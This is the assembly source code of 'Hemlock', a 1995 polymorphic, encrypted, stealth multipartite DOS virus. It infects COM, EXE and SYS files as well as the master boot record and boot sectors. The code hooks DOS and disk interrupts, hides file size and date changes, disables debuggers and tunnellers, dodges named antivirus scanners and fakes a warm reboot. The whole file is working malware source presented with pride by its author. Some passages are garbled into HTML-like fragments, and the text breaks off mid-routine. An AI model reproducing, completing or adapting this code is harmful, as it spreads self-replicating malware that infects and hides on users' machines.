﻿


;
;                      Hemlock Virus Source by qark
;                      +--------------------------+
;
;  Origin:      Australia, February 1995
;  Targets:     COM/EXE/SYS/MBR/BS
;  Polymorphic: Yes
;  Encrypted:   Yes
;  Stealth:     Full stealth as it redirects reads to infected bootsectors
;               and will return a clean copy if an infected file is read.
;  Armoured:    Attempting to trace int 21h or int 13h by a debugger/tunneler
;               will be disabled or cause a system hang.
;  Tunneling:   No, but checks for fixed ROM BIOS entry points by examining
;               code in segment F000.  If found will set the vectors to these
;               instead of the original vectors.
;  Damage:      None
;  Assembler:   A86 v3.71
;  Other stuff: Disables stealth when the following programs are run PKZIP,
;               LHA, ARJ, CHKDSK, NDD and SCANDISK.  When WIN or TBSCAN are
;               executed, command line options are added to avoid detection.
;               When CTRL-ALT-DEL (warm boot) is pressed, the virus will
;               copy the original interrupt table back and call int 19h
;               which will effectively mimic a warm boot.  If the computer
;               is in protected mode it will call a normal reboot instead.
;               If DOSDATA.SYS (a QEMM driver) is detected a different
;               routine will be used for grabbing int21h when loading from
;               boot.  Because SYS infection is unstable the virus does not
;               go resident, but instead checks to see if the MBR is infected
;               and if clean, infects it.  The polymorphism is simple in that
;               it basically swaps around lines of the decryption, but no
;               simple signature will detect it.
;
;       This is probably the best virus to ever come from Australia.
;
;       Hemlock is the poison that killed Socrates and the way I figure it, 
;       what's good for one greek philosopher is good enough for another.
;

        org     0

        db      9 dup (90h)             ;This is setup for the polymorphism.
enc_loop:
        db      15 dup (90h)            ;18
        mov     si,offset enc_end + 100h
enc_start:
        sub     si,offset enc_end        

        cld                             ;Forward movement.

        mov     ax,0efbeh
        mov     bl,9
        int     13h                     ;Check if we are already home...

        cmp     ax,0BEEFh
        je      resident

        ;AX=01BE because of the error code passed into AH
        ;This will kill f-prot.
        add     word ptr cs:[si+offset jmp_off],ax

        db      0ebh,0                  ;Clear prefetch        

        db      0e9h                    ;JMP xxxx
jmp_off dw      6 - 01beh       ;01BE=The return size from the int13 call.
bogus_end:
        mov     ax,4c00h
        int     21h
        db      20h
real_continue:
        sub     word ptr cs:[si+offset jmp_off],ax

        call    check_mbr               ;Is the MBR infected with our virus ?
        je      mbr_done
        call    setrom15_13
        call    infect_mbr
        call    reset15_13

mbr_done:
        push    ds                      ;Save PSP

        mov     ax,es
        dec     ax                      ;MCB segment.
        xor     di,di                   ;Zero DI
        
        mov     ds,ax

        ;Using [DI] is smaller than [0], saves a byte or two.
        ;Thanx to Memory Lapse for that optimisation.

        cmp     byte ptr [di],'Z'       ;DI=0 Check MCB type.
        jne     pop_resident

        sub     word ptr [di+3],(offset mem_size /16) +1
        sub     word ptr [di+12h],(offset mem_size /16) +1
        mov     ax,word ptr [di+12h]    ;Our segment into AX.
        mov     es,ax

        push    cs
        pop     ds                      ;DS=CS
        mov     cx,offset end_virus     ;Our virus length.
        rep     movsb                   ;Move our virus in memory.

        sub     si,di                   ;SI points to our virus start again.

        push    si

        mov     ds,cx                   ;DS=CX=0
        mov     si,21h*4                ;Set int 21
        mov     di,offset i21
        movsw
        movsw
        mov     word ptr [si-4],offset int21handler
        mov     word ptr [si-2],es

        mov     si,13h*4                ;Set int 13
        mov     di,offset i13
        movsw
        movsw
        mov     word ptr [si-4],offset int13handler
        mov     word ptr [si-2],es

        mov     byte ptr es:flag21,1
        
        pop     si

pop_resident:
        pop     ds              ;Restore PSP
resident:
        push    ds
        pop     es

        cmp     byte ptr cs:[si+offset filetype],'E'
        je      exe_return
        ;COM file return.
        mov     di,100h         ;Offset of COM start.
        push    di              ;Where we return to.
        add     si,offset header
        mov     cx,18h
        rep     movsb           ;Move the original header back.
        ret                     ;IP -> 100h

exe_return:
        mov     ax,ds           ;DS=PSP
        add     ax,10h          ;10H = size of PSP
        add     word ptr cs:[si+jump+2],ax      ;Fix the return JMP FAR
        cli
        mov     sp,word ptr cs:[si+offset header + 10h]
        add     ax,word ptr cs:[si+offset header + 0eh]
        mov     ss,ax           ;SS:SP now fixed
        sti
        xor     ax,ax
        xor     bx,bx
        xor     si,si
        
        db      0ebh,0          ;JMP $+2  Just clear the prefetch.

        db      0eah            ;Return to original EXE.
jump    dd      0      

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Infected device drivers call this when they execute.
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
SysEntry:
        push    bp                      ;<--this turns="" into="" our="" ret="" later="" on.="" push="" bp="" ;save="" bp.="" mov="" bp,sp="" ;get="" the="" sp="" to="" change="" the="" stack.="" push="" si="" ;save="" our="" other="" stuff.="" push="" ax="" db="" 0beh="" ;mov="" si,xxxx="" delta_sys="" dw="" 0="" ;our="" delta="" offset.="" mov="" ax,cs:[si+offset="" sysreturn]="" ;the="" address="" of="" the="" orig="" ;handler.="" mov="" word="" ptr="" [bp+2],ax="" ;'ret'="" to="" the="" original="" routine.="" mov="" word="" ptr="" cs:[6],ax="" ;restore="" the="" original="" pointer="" ;so="" that="" we="" aren't="" called="" again.="" ;do="" the="" stuff="" you="" want="" to="" here....="" push="" and="" pop="" tho="" push="" bx="" mov="" ax,0efbeh="" ;residency="" test="" xor="" bx,bx="" int="" 13h="" pop="" bx="" cmp="" ax,0beefh="" ;if="" resident="" then="" exit.="" je="" sys_res="" call="" check_mbr="" je="" sys_res="" call="" setrom15_13="" call="" infect_mbr="" call="" reset15_13="" sys_res:="" pop="" ax="" pop="" si="" pop="" bp="" ret="" ;it="" will="" return="" to="" the="" handler="" that="" was="" supposed="" to="" ;be="" called="" instead="" of="" this="" one.="" sysreturn="" dw="" 0="" ;the="" original="" strategy="" routine.="" ;end="" of="" the="" stub="" part="" of="" the="" virus...=""></--this><>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;Beginning of the resident routines...
Int21Handler    Proc    Near
;;;;;;
;Instead of the good old CMP AH,XX to check for the DOS function, I think
;that I'll bung in a cooleo little jump table... always good to try new
;tricks...
;;;;;;

        call    anti_tunnel                     ;Stop all other tunneling.

        push    si
        push    ax

        mov     si,offset function_table        ;SI=My little jump table.
        cld
Index_function:
        cmp     si,offset end_table             ;End of table...
        je      not_viral
        db      2eh                             ;CS:
        lodsb
        cmp     ah,al                           ;Do the functions match ?
        je      do_jump
        inc     si                              ;I would use lodsw but that
        inc     si                              ;would destroy AH.
        jmp     index_function
do_jump:
        db      2eh                             ;CS:
        lodsw
        jmp     ax

not_viral:
        jmp     pop_end

        ;Below is the virus entry jump table.

function_table  db      11h                     ;Dir ffirst
                dw      offset dir_stealth
                db      12h                     ;Dir ffnext
                dw      offset dir_stealth
                db      3dh                     ;Open
                dw      offset file_open
                db      3fh                     ;File read
                dw      offset file_read
                db      43h                     ;Attribute change
                dw      offset file_infect
                db      4bh                     ;Execute
                dw      offset file_infect
                db      4eh                     ;Handle ffirst
                dw      offset find_stealth
                db      4fh                     ;Handle fnext
                dw      offset find_stealth
                db      56h                     ;Rename
                dw      offset file_infect
                db      57h                     ;Date and time
                dw      offset file_time
                db      6ch                     ;Open
                dw      offset file_open
end_table:

;.................
File_Read:              ;3F arrives here.
        pop     ax
        pop     si
        
        cmp     byte ptr cs:stealth,0
        je      no_read_stealth

        call    check_handle
        jnc     good_handle

no_read_stealth:
        jmp     jend                    ;Outta here...
good_handle:

        push    es
        push    di
        call    get_sft
        jc      toobig
        call    check_years
        jae     stealth_read
toobig:
        pop     di                      ;Uninfected, so dont stealth.
        pop     es
        jmp     jend                    ;The push/pops are equal everywhere..

        file_pointer    dw      0

stealth_read:
        ;We've already reduced the file size within the SFT, (in file_open)
        ;so if they lseek to the end to try and find the virus they won't 
        ;reach it, so all we have to do is make sure if they are reading
        ;near the header that we stealth it.  Not too hard is it ? :)
        ;The header is only the first 18h bytes so we only mess with that.

        cmp     word ptr es:[di+17h],0
        jne     toobig
        cmp     word ptr es:[di+15h],18h
        jae     toobig

        push    word ptr es:[di+15h]    ;Save the current file pointer
        pop     word ptr cs:file_pointer
        
        pop     di
        pop     es


        call    Int21norm                       ;Do their read.
        jnc     ok_read
        jmp     bad_read
ok_read:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    es
        pushf

        mov     ax,word ptr cs:file_pointer

        ;We want to overwrite whats at the current file pointer with
        ;what is supposed to be there.  To do this we must work out
        ;whether it has read past the header, or just inside the header.

        call    get_sft
        jnc     good_read_sft
        jmp     bad_read_sft
good_read_sft:
        add     ax,cx
        jc      large_read              ;Reading near FFFF bytes
        cmp     ax,18h
        jbe     calc_read               ;Read past the header
large_read:
        sub     ax,cx
        mov     cx,18h
        sub     cx,ax
        jmp     short long_read
calc_read:
        sub     ax,cx
long_read:              ;AX=File pointer, CX=bytes to read.

        ;Save the current file pointer.
        push    word ptr es:[di+17h]
        push    word ptr es:[di+15h]

        ;Save the current file length
        push    word ptr es:[di+13h]
        push    word ptr es:[di+11h]

        ;Extend the file length to include the virus

        add     word ptr es:[di+11h],offset end_virus
        adc     word ptr es:[di+13h],0

        push    word ptr es:[di+11h]    ;File size --> File pointer
        pop     word ptr es:[di+15h]
        push    word ptr es:[di+13h]
        pop     word ptr es:[di+17h]

        sub     word ptr es:[di+15h],18h        ;Headersize back
        sbb     word ptr es:[di+17h],0

        add     word ptr es:[di+15h],ax         ;Add on their file pointer
        adc     word ptr es:[di+17h],0

        mov     al,3fh
        call    int21h             ;Will read into their buffer the orig shit

        pop     word ptr es:[di+11h]    ;Restore file length
        pop     word ptr es:[di+13h]

        pop     word ptr es:[di+15h]    ;Restore file pointer
        pop     word ptr es:[di+17h]
bad_read_sft:
        popf
        pop     es
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
bad_read:
        
read_exit:
        retf    2
;.................
File_Open:              ;3D and 6C arrive here.
        pop     ax
        pop     si
        call    infect                  ;Infect the file.
        call    Int21norm               ;Do their open   
        jc      exit_open
        pushf
        xchg    bx,ax
        call    check_handle
        xchg    bx,ax
        jc      good_exit_open

        push    es
        push    di
        xchg    bx,ax                   ;File handle into BX
        call    get_sft
        xchg    bx,ax
        jc      pop_open_exit

        call    check_years
        jb      pop_open_exit           ;Is it infected ? Nope, outta here..

        cmp     byte ptr cs:stealth,0
        je      pop_open_exit

;Remove our virus size from the SFT.  This means that if they try to lseek
;to the end of the infected program they will see no size difference, and
;they will only be able to reach the end of the normal file.
;We no longer have to worry about them reading in the virus body from the end
;of the file, we only have to protect the header at the start.

        sub     word ptr es:[di+11h],offset end_virus
        sbb     word ptr es:[di+13h],0

pop_open_exit:
        pop     di
        pop     es
good_exit_open:
        popf
exit_open:
        retf    2
;.................
File_Infect:            ;43, 4B and 56 arrive here.
        pop     ax
        pop     si

        cmp     ax,4b00h                ;File execute ?
        jne     non_execute

        mov     byte ptr cs:stealth,1   ;Turn stealth on.
        call    check_names             ;This may turn stealth off.
        call    infect
        call    int21norm               ;Do the interrupt
        mov     byte ptr cs:stealth,1   ;Turn stealth on.
        retf    2                       ;Exit interrupt.
non_execute:
        call    infect                  ;Infect it.
far_time_exit:
        jmp     jend
;.................
File_Time:              ;57 arrives here.
                                ;Hide the 100 years marker.
        pop     ax
        pop     si

        cmp     byte ptr cs:stealth,0
        je      far_time_exit

        cmp     al,01
        je      far_time_exit

        call    Int21norm       ;Call it
        pushf
        jc      time_ok
        cmp     dh,200
        jb      time_ok

        sub     dh,200          ;Take away the 100 years.
        
time_ok:
        popf
        retf    2
;.................
Dir_Stealth:            ;11 and 12 arrive here.
;No change in size during a DIR listing.
        
        pop     ax
        pop     si

        cmp     byte ptr cs:stealth,0
        je      far_time_exit
        
        call    Int21norm                       ;Call the interrupt
        cmp     al,0                            ;straight off.
        jne     end_of_dir

        push    es
        push    ax                              ;Save em.
        push    bx

        mov     al,2fh                          ;Get DTA address.
        call    int21h

        cmp     byte ptr es:[bx],0ffh           ;Extended FCB ?
        jne     not_extended

        add     bx,7                            ;Add the extra's.
not_extended:
        mov     al,byte ptr es:[bx+1ah]         ;Move high date
        cmp     al,200
        jb      dir_pop                         ;Not ours to play with.

        sub     al,200                          ;Restore to original date.

        mov     byte ptr es:[bx+1ah],al

        ;Subtract the file length.
        sub     word ptr es:[bx+1dh],offset end_virus
        sbb     word ptr es:[bx+1fh],0
dir_pop:
        pop     bx
        pop     ax
        pop     es

end_of_dir:

        iret

stealth_exit:
        jmp     jend            ;Exit.
;.................
Find_Stealth:           ;4E and 4F arrive here.

        pop     ax
        pop     si

        cmp     byte ptr cs:stealth,0
        je      stealth_exit

        call    Int21norm       ;Do the original find call.
        jc      end_search

        pushf
        push    es
        push    bx
        push    si

        mov     al,2fh          ;Get DTA address
        call    int21h

        mov     al,byte ptr es:[bx+19h]
        cmp     al,200          ;Get the file year from the DTA
        jb      search_pop

        sub     al,200          ;Set it back to the normal year.

        mov     byte ptr es:[bx+19h],al ;Now they won't spot us!

        ;Subtract the file length.
        sub     word ptr es:[bx+1ah],offset end_virus
        sbb     word ptr es:[bx+1ch],0

search_pop:
        pop     si
        pop     bx
        pop     es
        popf
end_search:
        retf    2                       ;IRET without POPF
;.................
Far_End:                                ;Gotta use a lame one of these
                                        ;because of the 128 byte jump :(
        jmp     no_extension

;Infect EXE/COM/SYS
Infect:                                 
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es
        push    bp

        xor     bp,bp                   ;Zero BP for anti-heuristics

        cmp     ah,6ch
        jne     no_si_fixup
        mov     dx,si                   ;Function 6C stores the name at
                                        ;DS:SI instead of DS:DX.
no_si_fixup:
        cld
        push    ds
        pop     es
        mov     al,'.'
        mov     di,dx
        mov     cx,128
        repne   scasb                   ;Search for extension.

        jne     far_end

        mov     byte ptr cs:filetype,0  ;Reset the filetype flag

        mov     si,di
        lodsw
        or      ax,2020h                ;Convert to lowercase.
        cmp     ax,'oc'                 ;COM
        jne     chk_exe
        lodsb
        or      al,20h
        cmp     al,'m'
        jne     far_end
        jmp     good_name
chk_exe:                        ;EXE
        cmp     ax,'xe'
        jne     chk_sys
        lodsb
        or      al,20h
        cmp     al,'e'
        jne     far_end
        jmp     good_name
chk_sys:                        ;SYS
        cmp     ax,'ys'
        jne     far_end
        lodsb
        or      al,20h
        cmp     al,'s'
        jne     far_end
        mov     byte ptr cs:filetype,'S'
good_name:
        lea     ax,[bp+3dh]             ;Same as mov ax,3d but anti-heuristic
        call    int21h
        jc      far_end
        xchg    bx,ax                   ;This is smaller than XCHG AX,BX
                                        ;BX=File handle.

        call    set_int24

        call    get_sft
        jc      sys_close_exit
        call    check_years             ;Is it already infected ?
        ja      sys_close_exit
        
        mov     word ptr es:[di+2],2    ;Change file to read/write.

        push    cs
        pop     es                      ;ES=CS
        lea     ax,[bp+3fh]             ;Same as MOV AX,3F
        push    cs
        pop     ds                      ;DS=CS
        mov     cx,1ch                  ;Read in the full EXE header.
        mov     dx,offset header
        call    int21h

        mov     si,offset header
        lodsw                           ;AX=First two bytes of header.

;I DO NOT want to infect SYS files that have an EXE header because
;that means I will infect shit like QEMM and DOSDATA, which will fuck
;everything up...

        cmp     byte ptr cs:filetype,'S'
        je      sys_infect

        add     al,ah
        cmp     al,167                  ;Test for ZM/MZ
        jne     com_infect
        jmp     exe_infect

;++++++++++++++++++++++
SYS_Infect:
;Check first dword for -1 (-1 = 0ffffffffh)
;SYS files mostly start with ffffffffh so its a good marker to check.

        inc     ax              ;AX=0 if SYS file
        jnz     sys_close_exit
        lodsw
        inc     ax
        jnz     sys_close_exit
        lodsw                   ;Same as INC SI, INC SI but one byte

        ;SI=Offset of 6 into the header.
        ;DS:SI=The SYS files strategy routine.
        lodsw                   ;Strategy routine offset into AX
        mov     word ptr sysreturn,ax
        call    lseek_end
        cmp     ax,60000
        je      sys_close_exit
        cmp     ax,1024
        jb      sys_close_exit

        call    get_date

        ;File length is in AX.
        mov     word ptr delta_sys,ax
        push    ax
        mov     al,40h                  ;Write virus at end.
        mov     cx,offset end_virus
        xor     dx,dx
        call    int21h
        pop     ax
        jc      sys_close_exit

        add     ax,offset sysentry
        mov     word ptr header+6,ax    ;Point the strategy routine at our
        
        ;lseek to start.

        call    lseek_start

        mov     al,40h                  ;Write our cooler header back.
        mov     dx,offset header
        mov     cx,18h
        call    int21h
        jc      sys_close_exit

        call    set_marker              ;Set the 100 year marker.
sys_close_exit:
        jmp     exe_close               ;Outta here !

;+++++++++++++++++++++++
COM_Infect:                             ;This routine works with COM files.

        mov     byte ptr filetype,'C'
        call    lseek_end
        or      dx,dx                   ;Waaaay too big!
        jnz     com_close_exit
        cmp     ax,62300                ;Too big...
        ja      com_close_exit
        cmp     ax,1024                 ;Teensy weensy
        jb      com_close_exit

        call    get_date

        push    ax                      ;Save file size in AX

        add     ax,100h                 ;COM's start at 100h
        mov     delta,ax                ;Fixup the delta offset.

        call    setup_poly

        mov     al,40h                  ;Append virus.
        mov     dx,offset end_virus
        mov     cx,offset end_virus
        call    int21h
        pop     ax                      ;Restore file size.
        jc      com_close_exit          ;Failed write...

        sub     ax,3                    ;JMP takes 3 bytes.
        mov     word ptr virus_jump+1,ax        ;Our jump buffer is ready !

        call    lseek_start

        mov     al,40h                  ;Write our jump.
        mov     dx,offset virus_jump
        mov     cx,3
        call    int21h
        jc      com_close_exit          ;Failed write...

        call    set_marker              ;Set the 100 years marker.
com_close_exit:
        jmp     exe_close
;+++++++++++++++++++++++
EXE_Infect:
        mov     byte ptr filetype,'E'

        dec     si
        dec     si                      ;SI = Offset header

        cmp     word ptr [si+1ah],0     ;Overlays are evil!
        jne     com_close_exit
        cmp     word ptr [si+18h],40h   ;So is windows shit!
        jae     com_close_exit

        call    get_date

        push    [si+2]                  ;Save pages
        push    [si+4]                  ;Save last page size
        push    [si+0ch]                ;Save maximum memory
        push    [si+0eh]                ;Save SS
        push    [si+10h]                ;Save SP
        push    [si+14h]                ;Save IP
        push    [si+16h]                ;Save CS

        mov     ax,word ptr [si+0ch]    ;Get Maxmem
        inc     ax                      ;If FFFF then don't change.
        jz      set_to_max

        ;We are doing this because when TBSCAN is run it checks it's segment
        ;size in memory.  If it is infected it will detect the virus because
        ;the memory allocated to it is more than it asked for.  So downsize
        ;maxmem by the virus paras and wow! passed sanity check!  Did you
        ;know that TBSCAN doesn't use it's 'OWN' file system to check
        ;itself ?  Nope, it uses DOS so you can stealth is easy enough.

        ;Note: I did not invent this idea!  A person who wishes to remain
        ;anonymous told it to me.

        sub     word ptr [si+0ch],offset end_virus / 16 +1

set_to_max:

        push    si
        add     si,14h
        mov     di,offset jump
        movsw
        movsw                           ;CS:IP into JUMP
        pop     si

        call    lseek_end
                                        ;DX:AX=File length
        push    dx                      ;Save file length.
        push    ax

        mov     cx,16                   ;Divide filesize by 16.
        div     cx                      ;Remainder = IP
                                        ;Answer = CS

        sub     ax,word ptr [si+8]      ;Subtract headersize.
        mov     word ptr delta,dx

        mov     word ptr [si+14h],dx    ;IP into header
        mov     word ptr [si+16h],ax    ;CS into header

        add     dx,offset end_virus + 1000      ;SP past end of file.

        mov     word ptr [si+0eh],ax    ;SS=CS
        mov     word ptr [si+10h],dx    ;SP past end of our virus.

        pop     ax
        pop     dx                      ;File length into DX:AX

        add     ax,offset end_virus
        adc     dx,0
        
        mov     cx,512
        div     cx
        or      dx,dx
        jz      no_page_fix             ;Page ends on 512 boundary.
        inc     ax                      ;Add the last page.
no_page_fix:
        mov     word ptr [si+4],ax
        mov     word ptr [si+2],dx

        call    lseek_start

        mov     dx,si                   ;DX=Offset header
        mov     cx,18h
        mov     al,40h                  ;Write header back.
        call    int21h
        
        pop     [si+16h]                ;Restore all the header stuff
        pop     [si+14h]                ;that I changed.
        pop     [si+10h]
        pop     [si+0eh]
        pop     [si+0ch]
        pop     [si+4]
        pop     [si+2]

        jc      exe_close

        call    lseek_end

        call    setup_poly

        mov     al,40h
        mov     dx,offset end_virus
        mov     cx,offset end_virus
        call    int21h
        jc      exe_close

        call    set_marker
exe_close:
        mov     al,3eh
        call    int21h

        call    reset_int24
no_extension:
        pop     bp
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        ret
;.................       End of infection procedure...

pop_end:
        pop     ax
        pop     si

jend:
        db      0eah
        i21     dd      0

Int21Handler    EndP

Int21h:
        xchg    ah,al                   ;<-- swap="" ah="" and="" al="" for="" heuristics.="" int21norm:="" pushf="" push="" cs="" call="" jend="" ret=""></--><>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
Bootsector:
        ;This is what we write to the MBR/BS
        xor     ax,ax
        mov     es,ax
        mov     si,7c00h
        cli                             ;Ints off while changing
                                        ;stack.
        mov     ss,ax
        mov     sp,si
        sti
        mov     ds,ax

                                        ;CS,DS,ES,SS,AX=0    SI,SP=7C00H

        sub     word ptr [413h],8       ;3.5k for virus + 3.5k buffer
                                        ;+1K for IVT
                                        ;40:13 = memory.
        int     12h

        mov     cl,6
        shl     ax,cl
        mov     es,ax                   ;ES=Our virus segment.

        xor     ax,ax
        int     13h                     ;Reset Disk

        xor     dh,dh                   ;Head 0
        mov     cx,4                    ;From sector 4, track 0
        or      dl,dl
        js      hd_resident             ;>= 80h
        
        ;Self modifying code because the floppy disk storage track/head
        ;changes all the time.

        db      0b9h                    ;MOV CX,xxxx
        floppy_sect     dw      4
        db      0b6h                    ;MOV DH,xxxx
        floppy_head     db      0

hd_resident:
        xor     bx,bx                   ;Read to start of segment
        mov     ax,207h                 ;Read 7 sectors
        int     13h                     ;This ought to read the virus into
                                        ;our allocated buffer.
        jc      hd_resident


        mov     byte ptr es:flag21,0            ;Reset the int21 flag
        mov     byte ptr es:mz_counter,1        ;Reset exe counter
        mov     byte ptr es:qemm,0              ;Reset qemm flag

        mov     si,13h*4
        cld
        mov     di,offset i13
        movsw
        movsw
        mov     word ptr [si-4],offset int13handler
        mov     word ptr [si-2],es

        mov     si,9*4                          ;Set int9 to ours.
        mov     di,offset i9
        movsw
        movsw
        mov     word ptr [si-4],offset int9handler
        mov     word ptr [si-2],es

        xor     si,si                           ;Copy interrupt table.
        mov     di,offset IVT
        mov     cx,1024
        rep     movsb

        mov     si,449h
        movsb

        int     19h
                
        Marker  db      'Eu'                    ;Just a crap marker
BS_End:

;<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;;;
rend:
        retf    2
;;;
multi:
        jmp     multipartite
;;;
stealth_bs:
        mov     cx,3
        mov     ax,102h

        or      dl,dl
        js      stealth_mbr             ;DL>=80H then goto stealthmbr

        mov     cx,14
        mov     dh,1
stealth_mbr:
        call    int13h
        jmp     bs_pop_end
;;;
Int13Handler:

        call    anti_tunnel        

        xchg    ah,al
        
        cmp     al,2
        jne     multi

        cmp     cx,1
        jne     multi

        or      dh,dh
        jnz     multi

        call    int13h
        jc      rend

        pushf                           ;Save everything we mess with.
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        cmp     word ptr es:[bx+offset marker - offset bootsector],'uE'
        je      stealth_bs

        mov     cx,3                    ;Orig HD MBR at sector 3.

        or      dl,dl                   ;Harddisk ?
        js      write_orig              ;80H or above ?

        ;Calculate shit like track/head for floppy******
        push    dx

        push    cs
        pop     ds
        
        mov     ax,es:[bx+18h]          ;Sectors per track.
        sub     es:[bx+13h],ax          ;Subtract a track.
        mov     ax,es:[bx+13h]          ;AX=total sectors.
        mov     cx,es:[bx+18h]          ;CX=sectors per track
        xor     dx,dx
        div     cx                      ;Total sectors/sectors per track

        xor     dx,dx
        mov     cx,word ptr es:[bx+1ah] ;CX=heads
        div     cx                      ;Total tracks/heads

        push    ax
        xchg    ah,al                   ;AX=Track
        mov     cl,6
        shl     al,cl                   ;Top 2 bits of track.
        or      al,1                    ;We'll use the first sector onward.
        mov     word ptr floppy_sect,ax

        pop     ax
        mov     cx,word ptr es:[bx+1ah] ;CX=heads
        xor     dx,dx
        div     cx                      ;Track/Total Heads

        mov     byte ptr floppy_head,dl ;Remainder=Head number

        mov     cx,14                   ;Floppy root directory.
        pop     dx
        mov     dh,1

write_orig:
        mov     ax,103h
        call    int13h
        jc      bs_pop_end

        push    es
        pop     ds

        mov     si,bx
        push    cs
        pop     es                      ;ES=CS
        mov     cx,510                  ;Move original sector to our buffer.
        cld
        mov     di,offset end_virus
        rep     movsb
        
        mov     ax,0aa55h               ;End of sector marker.
        stosw

        mov     si,offset bootsector    ;Move our virus BS into the buffer.
        push    cs
        pop     ds                      ;DS=ES=CS
        mov     di,offset end_virus
        mov     cx,offset bs_end - offset bootsector
        rep     movsb

        xor     ax,ax                   ;Reset disk controller
        call    int13h
        
        mov     ax,103h
        xor     dh,dh
        inc     cx                      ;CX=0 from 'rep movsb'  So CX=1
        mov     bx,offset end_virus
        call    int13h

        mov     cx,4
        or      dl,dl
        js      hd_virus_write

        mov     cx,word ptr floppy_sect
        mov     dh,byte ptr floppy_head

hd_virus_write:
        xor     bx,bx
        mov     ax,703h
        call    int13h

bs_pop_end:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        popf
        jmp     rend

bs_exit:
        cmp     ax,0beefh
        jne     no_test
        iret
no_test:
        xchg    ah,al
        db      0eah
        i13     dd      0
;....................................
Multipartite:
        cmp     byte ptr cs:flag21,1            ;Have we already set int21 ?
        jne     check21
        jmp     short bs_exit
check21:
        push    ax
        push    cx
        push    si
        push    di
        push    es
        push    ds

        cmp     byte ptr cs:qemm,1              ;Have we detected QEMM ?
        je      qemm_multip

        ;This code looks for DOSDATA and if found waits for the 10th EXE 
        ;header instead of the first.

        mov     di,bx
        mov     al,'D'
        cld
        mov     cx,512
scan_dosdata:
        repne   scasb
        je      found_d
        jmp     short chk_exe_header
found_d:
        push    cs
        pop     ds
        mov     si,offset dosdata
        push    di                      ;Save buffer pointer
        push    cx                      ;Save buffer counter
        mov     cx,6
        repe    cmpsb
        pop     cx
        pop     di
        jne     scan_dosdata

        mov     byte ptr qemm,1
        mov     byte ptr mz_counter,10

qemm_multip:

        ;Multipartite condition #1 - Grab Int21 on any write

        cld
        cmp     al,3
        je      set_dos_vector
        
        ;Multipartite condition #2 - Grab Int21 on a residency test

        or      bx,bx           ;SYS res tests shouldn't be used.
        jz      chk_autoexec
        cmp     ax,0beefh
        je      set_dos_vector

        ;Multipartite condition #3 - Grab Int21 on reading AUTOEXEC.BAT
chk_autoexec:
        mov     si,bx
        push    es
        pop     ds

        lodsb
        cmp     al,'@'
        jne     chk_exe_header
        lodsw
        and     ax,0dfdfh
        cmp     ax,'CE'
        jne     chk_exe_header
        jmp     short set_dos_vector
        
        ;Multipartite condition #4 - Grab Int21 on read of third EXE

chk_exe_header:
        push    es
        pop     ds
        mov     si,bx
        lodsw
        cmp     ax,'MZ'
        je      found_mz
        cmp     ax,'ZM'
        jne     not_right
found_mz:
        dec     byte ptr cs:mz_counter
        jz      set_dos_vector
        jmp     short not_right
        
set_dos_vector:
        push    cs
        pop     es
        xor     ax,ax
        mov     ds,ax
        mov     si,21h*4
        mov     di,offset i21
        movsw
        movsw
        mov     word ptr [si-4],offset int21handler
        mov     word ptr [si-2],es
        mov     byte ptr cs:flag21,1
not_right:
        pop     ds
        pop     es
        pop     di
        pop     si
        pop     cx
        pop     ax
        cmp     ax,0beefh
        jne     not_res_test
        iret                            ;Pass back the residency marker.
not_res_test:
        jmp     bs_exit
;....................................
Int13h  Proc    Near
; AH & AL are swapped on entry to this call.

        pushf                   ;Setup our interrupt
        push    cs              ;Our segment
        call    bs_exit         ;This will also fix our AX
        xchg    ah,al           ;Fix our AX :)
        ret

Int13h  EndP
;....................................
Int9Handler:
;Checks for CTRL-ALT-DEL and does a fake reboot if so.

        push    ax
        push    ds
        push    cx
        
        in      al,60h                  ;Read the key from the keyboard port
        cmp     al,53h                  ;Is the key DEL ?
        jne     normal_i9

        xor     ax,ax
        mov     ds,ax
        mov     al,[417h]               ;Keyboard flag byte 0
        and     al,0ch                  ;Only leave CTRL and ALT
        cmp     al,0ch                  ;Are they both depressed ?
        jne     normal_i9

        ;Now test for an XT
        mov     al,2
        mov     cl,33
        shr     al,cl           ;286+ ignore any bits above bit 5
        test    al,1            ;286+ will only SHR AL,1 while XT will
                                ;clear AL.
        jz      reboot          ;We have an 8088 (XT) so reboot.
        smsw    ax              ;Machine Status Word into AX
        test    al,1            ;If bit 1 is on then it is protected mode
        jnz     normal_i9       ;Protected mode... no fake reboot.
reboot:
        in      al,61h                  ;Keyboard controller.
        push    ax
        or      al,80h                  ;Signal we got it.
        out     61h,al
        pop     ax
        out     61h,al
        
        mov     al,20h                  ;Signal EOI
        out     20h,al

        xor     ax,ax
        mov     al,byte ptr cs:mode     ;Reset original video mode.
        int     10h

        push    ds
        pop     es                      ;ES=0
        push    cs
        pop     ds                      ;DS=CS
        mov     cx,1024
        mov     si,offset IVT
        xor     di,di
        cld
        
        cli
        rep     movsb                   ;Copy the IVT back.
        sti
        push    cs
        pop     ds

        mov     byte ptr flag21,0               ;Reset the int21 flag
        mov     byte ptr mz_counter,1           ;Reset exe counter
        mov     byte ptr qemm,0                 ;Reset qemm flag

        xor     dx,dx
        int     19h

normal_i9:
        pop     cx
        pop     ds
        pop     ax

        db      0eah
        i9      dd      0
;....................................
Int15h  Proc    Near
        db      0eah
        i15     dd      0
Int15h  EndP
;....................................
Int24h  Proc    Near                    ;No write protect errors.
        mov     al,3
        iret
        i24     dd      0
Int24h  EndP
;....................................
;<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;               Subroutines and Shit
;<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;....................................
Get_Date:
;Saves the date/time of the file to TIME and DATE
;BX=File handle
        push    ax
        push    cx
        push    dx
        mov     ax,57h
